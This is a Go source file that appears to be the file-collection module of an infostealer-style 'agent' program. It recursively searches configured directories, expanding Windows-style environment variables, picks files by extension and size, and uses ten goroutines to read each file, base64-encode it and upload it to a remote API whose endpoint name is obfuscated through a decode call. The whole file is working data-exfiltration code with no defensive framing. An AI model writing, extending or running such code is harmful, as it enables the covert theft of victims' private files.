package modules

import (
	"agent/api"
	"agent/lib"
	"agent/vars"
	"encoding/base64"
	"os"
	"path"
	"strings"
	"sync"
)

func FindFiles(dir string) ([]string, error) {
	files := []string{}
	st, err := os.Stat(dir)
	if err != nil {
		return files, err
	}

	if !st.IsDir() {
		return files, lib.NewErr(vars.Msg_Baddir)
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		return files, err
	}

	for _, e := range entries {
		fp := path.Join(dir, e.Name())
		st, err = os.Stat(fp)
		if err != nil {
			continue
		}

		if st.IsDir() {
			subfiles, err := FindFiles(fp)
			if err != nil {
				continue
			}

			files = append(files, subfiles...)
			continue
		}

		for _, ext := range lib.Cfg.Files.Exts {
			if strings.HasSuffix(fp, ext) && st.Size()/1024/1024 <= int64(lib.Cfg.Files.Max) {
				files = append(files, fp)
				break
			}
		}
	}

	return files, nil
}

func sender(pathch chan string, wg *sync.WaitGroup) {
	defer wg.Done()

	for pth := range pathch {
		st, err := os.Stat(pth)
		if err != nil {
			continue
		}

		raw, err := os.ReadFile(pth)
		if err != nil {
			continue
		}

		api.SendJSON(lib.Decode(vars.Module_files), vars.TFile{
			Data: base64.StdEncoding.EncodeToString(raw),
			Size: int64(st.Size()),
			Path: pth,
		})

		lib.Print(vars.Msg_FileSend, pth)
	}
}

func placeEnv(p string) string {
	for _, e := range os.Environ() {
		kv := strings.Split(e, "=")
		if len(kv) != 2 {
			continue
		}

		key := "%" + kv[0] + "%"
		val := kv[1]
		p = strings.ReplaceAll(p, key, val)
	}
	return p
}

func GetFiles(wg *sync.WaitGroup) {
	allfiles := []string{}

	for _, p := range lib.Cfg.Files.Dirs {
		ap := placeEnv(p)
		files, err := FindFiles(ap)
		if err != nil {
			continue
		}
		allfiles = append(allfiles, files...)
	}

	var nwg sync.WaitGroup
	pch := make(chan string, len(allfiles))

	for i := 0; i < 10; i++ {
		nwg.Add(1)
		go sender(pch, &nwg)
	}

	for _, f := range allfiles {
		pch <- f
	}

	close(pch)
	nwg.Wait()

	lib.Print(vars.Msg_Done, lib.Decode(vars.Module_files))
	wg.Done()
}
